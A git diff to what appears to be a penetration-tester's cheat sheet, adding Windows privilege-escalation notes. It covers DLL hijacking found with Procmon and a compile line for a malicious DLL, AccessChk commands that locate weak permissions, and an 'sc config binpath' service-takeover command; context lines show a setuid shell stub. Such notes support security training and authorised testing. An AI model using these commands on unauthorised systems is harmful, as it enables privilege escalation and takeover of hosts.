@@ -94,6 +94,26 @@ int main()
 
 + [windows_service.c](https://github.com/sagishahar/scripts/blob/master/windows_service.c) <sup><sub>[[archive](assets/files/windows_service.c)]
 
+#### DLL Hijacking w/ Procmon.exe
+
+_Requires GUI (so RDP...)_
+
++ [Procmon.exe](https://download.sysinternals.com/files/ProcessMonitor.zip) <sup><sub>[[archive](assets/files/procmon.exe]
+
+Run the following; look for services that call DLLs that return "NAME NOT FOUND". You can add a DLL to these locations and it will be loaded in, in the context of the process (potentially as SYSTEM)
+
+```bash 
+# Victim - Run as Administrator (yes, I know...)
+procmon.exe
+```
+
+To exploit, use the `windows_dll.c` templated and compile with the following.
+
+```bash
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o [dll_name].dll
+```
+
+
 #### Cross-compiling for Windows
 
 ##### C & C++
@@ -242,7 +262,39 @@ wmic service [service name] call startservice
 # OR
 
 net stop [service name] && net start [service name].
+```
 
+### AccessChk
+
++ [AccessChk](https://download.sysinternals.com/files/AccessChk.zip) <sup><sub>[[archive](assets/files/accesschk_v5.02.exe]
+
+```bash
+# Accesschk stuff
+accesschk.exe /accepteula #(always do this first!!!!!)
+accesschk.exe -ucqv [service_name] #(requires sysinternals accesschk!)
+accesschk.exe -uwcqv "Authenticated Users" *  # (won't yield anything on Win 8)
+accesschk.exe -ucqv [service_name]
+
+# Find all weak folder permissions per drive.
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+
+# Find all weak file permissions per drive.
+accesschk.exe -uwqs Users c:\*.*
+accesschk.exe -uwqs "Authenticated Users" c:\*.*
+
+# Check permissions on spesific folder
+accesschk.exe -wvu "C:\Path\To\Folder" # Look for “FILE_ALL_ACCESS”
+```
+
+Check if you can change a service's binpath
+
+```bash
+# Detect
+accesschk.exe -wuvc [service_name] # Look for “SERVICE_CHANGE_CONFIG”
+
+# Exploit
+sc config [service_name] binpath= "[cmd]"
 ```
 
 ## Linux Privilege Escalation
@@ -260,8 +312,6 @@ int main(void)
     execl("/bin/sh", "sh", 0);
 }
 ```
-
-### Setuid.c
 
 ## Exfiltration
 
